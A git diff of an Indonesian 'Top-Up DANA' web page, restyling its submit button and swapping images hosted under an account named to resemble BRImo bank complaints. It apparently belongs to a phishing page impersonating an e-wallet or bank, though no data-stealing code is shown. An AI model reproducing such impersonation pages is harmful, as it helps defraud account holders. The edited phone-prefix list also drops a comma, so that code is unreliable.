@@ -1,14 +1,15 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta property="og:image" content="https://raw.githubusercontent.com/Peng4duanBrimo/Peng4duanBrimo.github.io/main/IMG-20240831-WA0024.jpg">
+  <meta name="theme-color" content="#0000ff">
+    <meta property="og:image" content="https://raw.githubusercontent.com/Peng4duanBrimo/Peng4duanBrimo.github.io/main/IMG-20240831-WA0023.jpg">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Top-Up DANA</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-image: url('https://raw.githubusercontent.com/Peng4duanBrimo/Peng4duanBrimo.github.io/main/IMG-20240831-WA0025.jpg'); /* URL gambar latar belakang */
+            background-image: url('https://raw.githubusercontent.com/Peng4duanBrimo/Peng4duanBrimo.github.io/main/IMG-20240831-WA0027.jpg'); /* URL gambar latar belakang */
             background-size: cover; /* Menyesuaikan gambar dengan ukuran layar */
             background-position: center; /* Posisikan gambar di tengah */
             margin: 0;
@@ -18,6 +19,7 @@
             justify-content: center;
             height: 100vh;
             overflow: hidden;
+            margin-top:30px;
         }
 
         .container {
@@ -83,24 +85,32 @@
         }
 
         .submit-button {
-            display: flex;
-            justify-content: flex-end;
-        }
+    display: flex;
+    justify-content: center; /* Memastikan tombol berada di tengah */
+    width: 100%; /* Memastikan .submit-button mengisi lebar kontainer */
+    padding: 0 30px; /* Menambahkan ruang di kiri dan kanan */
+    box-sizing: border-box; /* Menyertakan padding dalam perhitungan lebar */
+    margin-top: 20px; /* Tambahkan margin di atas jika diperlukan */
+}
 
-        .submit-button button {
-            padding: 10px 20px;
-            background-color: #273746; /* Biru Kehitaman */
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
+.submit-button button {
+    padding: 13px 40px; /* Padding horizontal lebih besar untuk membuat tombol lebih panjang */
+    background-color: #0000ff; /* Biru Kehitaman */
+    color: white;
+    border: none;
+    border-radius: 15px;
+    font-size: 13px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: background-color 0.3s;
+    width: 100%; /* Membuat tombol mengisi lebar kontainer .submit-button */
+    box-sizing: border-box; /* Menyertakan padding dalam perhitungan lebar */
+}
 
-        .submit-button button:hover {
-            background-color: #1c2833; /* Biru lebih gelap */
-        }
+.submit-button button:hover {
+    background-color: #0000ff; /* Biru lebih gelap */
+}
+
 
         .loader {
             border: 4px solid #f3f3f3;
@@ -210,7 +220,7 @@
         const validPrefixes = [
             '0878', '0877', '0859', '0818', '0817', '0895', '0896',
             '0882', '0881', '0852', '0853', '0822', '0821', '0811',
-            '0813', '0838', '0831', '0856', '0857', '0858', '0819','0888', '0812', '0889', '0815', '0816', '0814', '0899', '0823', '0897', '0898'
+            '0813', '0838', '0831', '0856', '0857', '0858', '0819' '0888', '0812', '0889', '0815', '0816', '0814', '0899', '0823', '0897', '0898'
         ];
         const submitButton = document.getElementById('submitButton');
 
